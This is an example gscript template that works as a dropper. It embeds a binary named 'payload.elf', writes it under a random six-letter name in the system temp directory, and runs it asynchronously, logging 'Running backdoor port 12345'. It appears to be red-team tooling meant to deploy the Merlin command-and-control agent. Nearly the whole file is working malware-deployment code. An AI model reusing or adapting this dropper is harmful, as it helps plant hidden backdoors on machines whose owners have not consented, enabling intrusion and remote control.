// Example gscript template
// Title: Merlin Example
// Author: ahhh
// Purpose: Drops merlin as an asset and executes it async
// Gscript version: 1.0.0
// ATT&CK: 

//priority:150
//timeout:150

//import:./payload.elf

//go_import:os as os

function Deploy() {  
    console.log("Gscript 3: payload.gs");
    // Getting our asset
    var binary = GetAssetAsBytes("payload.elf");
    // Getting a random string
    var temppath = os.TempDir();
    var naming = G.rand.GetAlphaString(6);
    naming = naming.toLowerCase();
    fullpath = temppath+"/"+naming;
    console.log("Create file name: "+ fullpath);
    // Write payload
    errors = G.file.WriteFileFromBytes(fullpath, binary[0]);
    console.log("Write payload on "+fullpath);
    // Run payload
    var running = G.exec.ExecuteCommandAsync(fullpath, [""]);
    console.log("Running backdoor port 12345");
    return true
}